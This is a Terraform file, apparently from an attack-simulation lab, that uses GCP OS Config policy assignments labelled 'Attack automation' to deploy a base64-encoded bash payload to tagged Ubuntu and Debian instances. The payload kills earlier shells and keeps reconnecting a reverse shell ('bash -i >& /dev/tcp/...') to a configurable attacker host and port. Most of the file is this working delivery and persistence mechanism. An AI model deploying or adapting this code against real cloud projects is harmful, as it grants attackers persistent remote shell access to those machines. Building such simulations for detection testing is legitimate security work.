locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    check_apt() {
        pgrep -f "apt" || pgrep -f "dpkg"
    }
    while check_apt; do
        log "Waiting for apt to be available..."
        sleep 10
    done
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    server="${local.host_ip}"
    timeout=600
    start_time=$(date +%s)
    # Check if $server is an IP address
    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $server, no need to resolve DNS"
    else
        log "checking dns resolution: $server"
        while true; do
            ip=$(dig +short $server)
            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
                current_time=$(date +%s)
                elapsed_time=$((current_time - start_time))
                if [ $elapsed_time -gt $timeout ]; then
                    echo "DNS resolution for $server timed out after $timeout seconds"
                    exit 1
                fi
                sleep 1
            else
                echo "$server resolved to $ip"
                break
            fi
        done
    fi
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    while true; do
        log "reconnecting: ${local.host_ip}:${local.host_port}"
        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
            log "reconnecting: ${local.host_ip}:${local.host_port}";
            sleep 10;
        done;
        log "disconnected - wait retry...";
        sleep 60;
        log "starting retry...";
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

locals {
    resource_name = "${replace(var.tag, "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
}



resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "this" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "${local.resource_name}"
  description = "Attack automation"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = jsondecode(<<-EOT
                            { 
                              "${var.tag}": "true",
                              "deployment": "${var.deployment}",
                              "environment": "${var.environment}"
                            }
                            EOT
                          )
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id        = "${local.resource_name}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "/bin/bash -c 'echo ${local.base64_payload} | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash - &' && exit 100"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 50
    }
    min_wait_duration = var.timeout
  }
}